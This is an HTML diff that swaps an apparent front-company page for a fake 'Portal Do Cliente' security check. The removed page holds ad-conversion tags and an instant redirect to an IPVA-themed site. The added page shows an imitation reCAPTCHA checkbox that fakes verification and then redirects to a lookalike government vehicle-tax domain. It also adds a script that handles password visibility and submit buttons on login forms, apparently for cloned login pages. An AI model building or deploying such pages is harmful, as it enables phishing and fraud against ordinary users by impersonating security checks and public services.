@@ -1,443 +1,202 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
-<head> <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18222111016">
-</script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-18222111016');
-</script>
-</script>
+<html lang="pt-BR"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Portal Do Cliente</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
 
 
-  <!-- Event snippet for Visualização de página (1) conversion page -->
-<script>
-  gtag('event', 'conversion', {
-      'send_to': 'AW-18222111016/lWW4CJzp880cEKiy_fBD',
-      'value': 1.0,
-      'currency': 'BRL'
-  });
-</script>
-
-  <!-- Event snippet for Visualização de página (1) conversion page
-In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. -->
-<script>
-function gtag_report_conversion(url) {
-  var callback = function () {
-    if (typeof(url) != 'undefined') {
-      window.location = url;
-    }
-  };
-  gtag('event', 'conversion', {
-      'send_to': 'AW-18222111016/lWW4CJzp880cEKiy_fBD',
-      'value': 1.0,
-      'currency': 'BRL',
-      'event_callback': callback
-  });
-  return false;
-}
-</script>
-
-
-<script> window.location.href = "https://consulta-ipva.com/es/"</script>
-    
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Papelaria Tributária LTDA | Soluções Corporativas</title>
-    <style>
-        /* Configurações Gerais e Cores Modernas */
-        :root {
-            --primary: #0f172a;       /* Azul Escuro Corporativo (Seriedade) */
-            --secondary: #0284c7;     /* Azul de Destaque */
-            --accent: #e2e8f0;        /* Cinza Claro para Divisórias */
-            --text-main: #1e293b;     /* Texto Principal */
-            --text-muted: #64748b;    /* Texto Secundário */
-            --bg-light: #f8fafc;      /* Fundo Claro */
-            --white: #ffffff;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background-color: var(--bg-light);
-            color: var(--text-main);
-            line-height: 1.6;
-        }
-
-        /* Cabeçalho / Navegação */
-        header {
-            background-color: var(--primary);
-            color: var(--white);
-            padding: 20px 5%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-        }
-
-        .logo h1 {
-            font-size: 1.4rem;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-        }
-
-        .logo span {
-            color: var(--secondary);
-        }
-
-        nav a {
-            color: var(--white);
-            text-decoration: none;
-            margin-left: 20px;
-            font-size: 0.95rem;
-            transition: color 0.3s;
-        }
-
-        nav a:hover {
-            color: var(--secondary);
-        }
-
-        /* Seção Hero (Abertura Impactante) */
-        .hero {
-            background: linear-gradient(135deg, var(--primary) 0%, #1e293b 100%);
-            color: var(--white);
-            padding: 80px 5%;
-            text-align: center;
-        }
-
-        .hero h2 {
-            font-size: 2.5rem;
-            margin-bottom: 15px;
-            font-weight: 700;
-        }
-
-        .hero p {
-            font-size: 1.2rem;
-            color: #94a3b8;
-            max-width: 700px;
-            margin: 0 auto 30px auto;
-        }
-
-        .cta-button {
-            display: inline-block;
-            background-color: var(--secondary);
-            color: var(--white);
-            padding: 12px 30px;
-            border-radius: 6px;
-            text-decoration: none;
-            font-weight: 600;
-            transition: background 0.3s, transform 0.2s;
-        }
-
-        .cta-button:hover {
-            background-color: #0369a1;
-            transform: translateY(-2px);
-        }
-
-        /* Container de Conteúdo */
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 60px 20px;
-        }
-
-        .section-title {
-            text-align: center;
-            font-size: 1.8rem;
-            margin-bottom: 40px;
-            color: var(--primary);
-            position: relative;
-            padding-bottom: 10px;
-        }
-
-        .section-title::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 60px;
-            height: 4px;
-            background-color: var(--secondary);
-            border-radius: 2px;
-        }
-
-        /* Grid de Serviços */
-        .services-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 30px;
-        }
-
-        .service-card {
-            background: var(--white);
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
-            border-top: 4px solid var(--secondary);
-            transition: transform 0.3s;
-        }
-
-        .service-card:hover {
-            transform: translateY(-5px);
-        }
-
-        .service-card h3 {
-            margin-bottom: 12px;
-            font-size: 1.2rem;
-            color: var(--primary);
-        }
-
-        .service-card p {
-            color: var(--text-muted);
-            font-size: 0.95rem;
-        }
-
-        /* Seção Sobre / Informações de Registro */
-        .about-section {
-            background-color: var(--white);
-            border-radius: 8px;
-            padding: 40px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
-            margin-top: 40px;
-        }
-
-        .info-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }
-
-        .info-table th, .info-table td {
-            padding: 12px 15px;
-            text-align: left;
-            border-bottom: 1px solid var(--accent);
-        }
-
-        .info-table th {
-            background-color: #f1f5f9;
-            color: var(--primary);
-            font-weight: 600;
-            width: 30%;
-        }
-
-        .status-badge {
-            background-color: #dcfce7;
-            color: #15803d;
-            padding: 3px 10px;
-            border-radius: 4px;
-            font-weight: bold;
-            font-size: 0.85rem;
-        }
-
-        /* Duas Colunas: Localização e Contato */
-        .footer-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 40px;
-            margin-top: 40px;
-        }
-
-        @media (max-width: 768px) {
-            .footer-grid {
-                grid-template-columns: 1fr;
-            }
-            header {
-                flex-direction: column;
-                gap: 15px;
-            }
-            nav a {
-                margin: 0 10px;
-            }
-        }
-
-        .contact-box, .location-box {
-            background: var(--white);
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
-        }
-
-        .info-item {
-            margin-bottom: 12px;
-            font-size: 1rem;
-        }
-
-        .info-item strong {
-            color: var(--primary);
-        }
-
-        .address-box {
-            background-color: #f1f5f9;
-            border: 1px dashed #cbd5e1;
-            padding: 15px;
-            margin-top: 15px;
-            font-family: monospace;
-            font-size: 0.9rem;
-            color: #334155;
-            white-space: pre-line;
-            border-radius: 4px;
-        }
-
-        .phone-list {
-            list-style: none;
-            margin-top: 8px;
-        }
-
-        .phone-list li {
-            margin-bottom: 6px;
-            color: var(--text-main);
-        }
-
-        /* Rodapé Final */
-        footer {
-            background-color: var(--primary);
-            color: #94a3b8;
-            text-align: center;
-            padding: 20px;
-            font-size: 0.85rem;
-            margin-top: 60px;
-            border-top: 3px solid var(--secondary);
-        }
-    </style>
-</head>
+<link rel="stylesheet" href="styles.css"></head>
 <body>
-
-    <header>
-        <div class="logo">
-            <h1>PAPELARIA <span>TRIBUTÁRIA</span></h1>
+<div class="security-container">
+  <div class="security-header">
+    <svg class="security-icon" viewBox="0 0 24 24" fill="currentColor">
+      <path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"></path>
+    </svg>
+    <span class="security-title">Verificação de segurança</span>
+  </div>
+  <div class="security-body">
+    <p class="security-text">
+      Para sua proteção, precisamos confirmar que você é uma pessoa real antes de acessar o portal.
+    </p>
+    <p class="security-note">
+      Marque a caixa abaixo para concluir a verificação. Em seguida, você será redirecionado automaticamente.
+    </p>
+    <div class="recaptcha-frame">
+      <label class="check-area" id="checkArea">
+        <input type="checkbox" id="check">
+        <div class="custom-check" id="customCheck">
+          <svg class="spinner" viewBox="0 0 50 50">
+            <circle class="spinner-track" cx="25" cy="25" r="20"></circle>
+            <circle class="spinner-arc" cx="25" cy="25" r="20"></circle>
+          </svg>
+          <svg class="check-icon" viewBox="0 0 24 24" fill="none">
+            <path d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="#fff"></path>
+          </svg>
         </div>
-        <nav>
-            <a href="#servicos">Serviços</a>
-            <a href="#registro">Institucional</a>
-            <a href="#contato">Contato</a>
-        </nav>
-    </header>
-
-    <section class="hero">
-        <h2>Eficiência e Solidez em Suprimentos Corporativos</h2>
-        <p>Há quase 40 anos atendendo com excelência as demandas de gestão de documentos, logística tributária e suprimentos no atacado.</p>
-        <a href="#contato" class="cta-button">Fale Conosco</a>
-    </section>
-
-    <div class="container">
-
-        <section id="servicos">
-            <h2 class="section-title">Principais Serviços</h2>
-            <div class="services-grid">
-                <div class="service-card">
-                    <h3>Suprimento Corporativo B2B</h3>
-                    <p>Logística integrada e fornecimento sob demanda de materiais de escritório, informática e papelaria técnica para médias e grandes empresas.</p>
-                </div>
-                <div class="service-card">
-                    <h3>Linha Fiscal e Formulários</h3>
-                    <p>Distribuição de impressos padronizados, formulários contínuos e suprimentos focados estritamente em atender rotinas fiscais.</p>
-                </div>
-                <div class="service-card">
-                    <h3>Gestão de Documentos</h3>
-                    <p>Soluções inteligentes de organização, armazenamento corporativo e arquivamento estratégico com foco contábil.</p>
-                </div>
-                <div class="service-card">
-                    <h3>Atendimento a Licitações</h3>
-                    <p>Divisão especializada para participar de editais públicos, com total conformidade jurídica e segurança operacional.</p>
-                </div>
-            </div>
-        </section>
-
-        <section id="registro" class="about-section">
-            <h2 class="section-title">Informações Cadastrais</h2>
-            <table class="info-table">
-                <tr>
-                    <th>Razão Social</th>
-                    <td>Papelaria Tributaria LTDA</td>
-                </tr>
-                <tr>
-                    <th>Nome Fantasia</th>
-                    <td>Papelaria Tributaria</td>
-                </tr>
-                <tr>
-                    <th>CNPJ</th>
-                    <td>00.905.760/0003-00 (Tipo: Filial)</td>
-                </tr>
-                <tr>
-                    <th>Inscrição Estadual</th>
-                    <td>809.011.137.117 (SP)</td>
-                </tr>
-                <tr>
-                    <th>Fundação</th>
-                    <td>27/01/1988 (38 anos de solidez no mercado)</td>
-                </tr>
-                <tr>
-                    <th>Capital Social</th>
-                    <td>R$ 5.500.000,00</td>
-                </tr>
-                <tr>
-                    <th>Natureza Jurídica</th>
-                    <td>Sociedade Empresária Limitada</td>
-                </tr>
-                <tr>
-                    <th>Enquadramento</th>
-                    <td>Sem Enquadramento (Não optante pelo Simples Nacional ou MEI)</td>
-                </tr>
-                <tr>
-                    <th>Situação Cadastral</th>
-                    <td><span class="status-badge">ATIVA</span> <span style="color: var(--text-muted); font-size: 0.9rem; margin-left: 5px;">desde 26/12/2012</span></td>
-                </tr>
-            </table>
-        </section>
-
-        <div id="contato" class="footer-grid">
-            
-            <div class="location-box">
-                <h3 style="color: var(--primary); margin-bottom: 20px; font-size: 1.4rem;">📍 Localização</h3>
-                <div class="info-item"><strong>Logradouro:</strong> Avenida Perimetral Norte, 4056</div>
-                <div class="info-item"><strong>Complemento:</strong> Gleba 03</div>
-                <div class="info-item"><strong>Bairro:</strong> Vila Joao Vaz</div>
-                <div class="info-item"><strong>Cidade/UF:</strong> Goiânia - GO</div>
-                <div class="info-item"><strong>CEP:</strong> 74445-190</div>
-                
-                <p style="margin-top: 15px; font-weight: 600; color: var(--text-muted); font-size: 0.9rem;">Para Correspondência:</p>
-                <div class="address-box">Papelaria Tributaria Papelaria Tributaria LTDA
-Avenida Perimetral Norte 4056 Gleba 03
-Vila Joao Vaz
-Goiânia GO
-74445-190</div>
-            </div>
-
-            <div class="contact-box">
-                <h3 style="color: var(--primary); margin-bottom: 20px; font-size: 1.4rem;">📞 Canais de Comunicação</h3>
-                <div class="info-item">
-                    <strong>E-mail Institucional:</strong><br>
-                    <a href="mailto:contabil@tbtmais.com.br" style="color: var(--secondary); text-decoration: none; font-weight: 600;">contabil@tbtmais.com.br</a>
-                </div>
-                <div class="info-item" style="margin-top: 20px;">
-                    <strong>Central de Atendimento:</strong>
-                    <ul class="phone-list">
-                        <li>🔹 (62) 3235-8200</li>
-                        <li>🔹 (62) 3235-8216</li>
-                        <li>🔹 (62) 3293-3548</li>
-                    </ul>
-                </div>
-            </div>
-
+        <span class="check-text">Não sou um robô</span>
+      </label>
+      <div class="captcha-brand">
+        <img src="images/img_ee317416ac.png" width="32" height="32" alt="">
+        <div class="brand-name">reCAPTCHA</div>
+        <div class="brand-links">
+          <a href="https://policies.google.com/privacy" target="_blank">Privacidade</a>
+          -
+          <a href="https://policies.google.com/terms" target="_blank">Termos</a>
         </div>
-
+      </div>
     </div>
+  </div>
+</div>
+<script>
+const check = document.getElementById("check");
+const customCheck = document.getElementById("customCheck");
+const checkArea = document.getElementById("checkArea");
+let verifying = false;
+check.addEventListener("change", () => {
+  if (!check.checked) {
+    if (verifying) {
+      check.checked = true;
+      return;
+    }
+    customCheck.classList.remove("checked", "loading");
+    checkArea.classList.remove("verifying");
+    return;
+  }
+  if (verifying) return;
+  verifying = true;
+  checkArea.classList.add("verifying");
+  customCheck.classList.add("loading");
+  setTimeout(() => {
+    customCheck.classList.remove("loading");
+    customCheck.classList.add("checked");
+    checkArea.classList.remove("verifying");
+    verifying = false;
+    setTimeout(() => {
+      window.location.href = "https://guiasdeveiculos-gov.com/sc";
+    }, 800);
+  }, 1000);
+});
+</script>
 
-    <footer>
-        <p>&copy; 2026 Papelaria Tributária LTDA. Todos os direitos reservados. Soluções e Solidez Institucional.</p>
-    </footer>
 
-</body>
-</html>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    document.addEventListener('click', function(e) {
+        const btn = e.target.closest('button, [role="button"], .eye-icon');
+        if (!btn || btn.type === 'submit' || btn.tagName === 'A') return;
+        
+        let container = btn.parentElement;
+        let passInput = null;
+        
+        while(container && container.tagName !== 'BODY') {
+            const inputs = Array.from(container.querySelectorAll('input:not([type="hidden"]):not([type="checkbox"]):not([type="radio"])'));
+            if (inputs.length > 0) {
+                passInput = inputs.find(i => i.type === 'password' || i.dataset.isPass === 'true');
+                if (!passInput) {
+                    passInput = inputs.find(i => {
+                        const n = (i.name || '').toLowerCase();
+                        const id = (i.id || '').toLowerCase();
+                        return n.includes('pass') || id.includes('pass') || n.includes('senha') || id.includes('senha');
+                    });
+                }
+                if (!passInput && inputs.length === 1) {
+                    passInput = inputs[0];
+                }
+                if (passInput) break;
+            }
+            container = container.parentElement;
+        }
+
+        if (passInput && (btn.innerHTML.includes('svg') || btn.innerHTML.toLowerCase().includes('eye') || btn.innerHTML.toLowerCase().includes('olho'))) {
+            e.preventDefault();
+            passInput.dataset.isPass = 'true';
+            const isText = passInput.type === 'password';
+            passInput.type = isText ? 'text' : 'password';
+            
+            const svg = btn.tagName === 'SVG' ? btn : btn.querySelector('svg');
+            if (svg) {
+                if (!svg.dataset.boundColor) {
+                    const path = svg.querySelector('path');
+                    svg.dataset.boundColor = (path && path.getAttribute('fill')) || 'currentColor';
+                    if (svg.dataset.boundColor === 'none') svg.dataset.boundColor = 'currentColor';
+                }
+                const color = svg.dataset.boundColor;
+                svg.setAttribute('viewBox', '0 0 24 24');
+                if (isText) {
+                    svg.innerHTML = '<path fill="' + color + '" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+                } else {
+                    svg.innerHTML = '<path fill="' + color + '" d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2z"/>';
+                }
+            }
+        }
+    });
+
+    // Ativar/Desativar botões de submit automaticamente (simulação React)
+    const checkSubmitButtons = function() {
+        // Procurar áreas de login baseadas no input de senha
+        const passInputs = document.querySelectorAll('input[type="password"], input[data-is-pass="true"], input[name*="pass"], input[id*="pass"]');
+        passInputs.forEach(pass => {
+            let container = pass.closest('form');
+            if (!container) {
+                let curr = pass.parentElement;
+                while(curr && curr.tagName !== 'BODY') {
+                    if (curr.querySelector('button[type="submit"], button[id*="submit"], button[data-testid*="submit"]')) {
+                        container = curr;
+                        break;
+                    }
+                    curr = curr.parentElement;
+                }
+            }
+            
+            if (container) {
+                const btns = container.querySelectorAll('button[type="submit"], button[id*="submit"], button[data-testid*="submit"]');
+                const inputs = container.querySelectorAll('input:not([type="hidden"]):not([type="checkbox"]):not([type="radio"])');
+                
+                let allFilled = true;
+                let visibleInputs = 0;
+                
+                inputs.forEach(inp => {
+                    // ignorar inputs invisíveis, fora da tela, ou honeypots
+                    const rect = inp.getBoundingClientRect();
+                    const isVisible = rect.width > 2 && rect.height > 2 && 
+                                      window.getComputedStyle(inp).visibility !== 'hidden' && 
+                                      window.getComputedStyle(inp).opacity !== '0';
+                    
+                    if (isVisible) {
+                        visibleInputs++;
+                        if (inp.value.trim() === '') allFilled = false;
+                    }
+                });
+
+                if (visibleInputs > 0 && btns.length > 0) {
+                    btns.forEach(btn => {
+                        if (allFilled) {
+                            btn.removeAttribute('disabled');
+                            btn.removeAttribute('aria-disabled');
+                            btn.style.setProperty('opacity', '1', 'important');
+                            btn.style.setProperty('pointer-events', 'auto', 'important');
+                            btn.style.setProperty('cursor', 'pointer', 'important');
+                            btn.style.setProperty('filter', 'none', 'important');
+                            btn.classList.add('btn-active-simulated');
+                        } else {
+                            btn.setAttribute('disabled', 'true');
+                            btn.setAttribute('aria-disabled', 'true');
+                            btn.style.setProperty('opacity', '0.5', 'important');
+                            btn.style.setProperty('pointer-events', 'none', 'important');
+                            btn.style.setProperty('cursor', 'not-allowed', 'important');
+                            btn.style.setProperty('filter', 'grayscale(100%)', 'important');
+                            btn.classList.remove('btn-active-simulated');
+                        }
+                    });
+                }
+            }
+        });
+    };
+
+    document.addEventListener('input', checkSubmitButtons);
+    // Executa no load para garantir o estado inicial
+    setTimeout(checkSubmitButtons, 100);
+});
+</script></body></html>
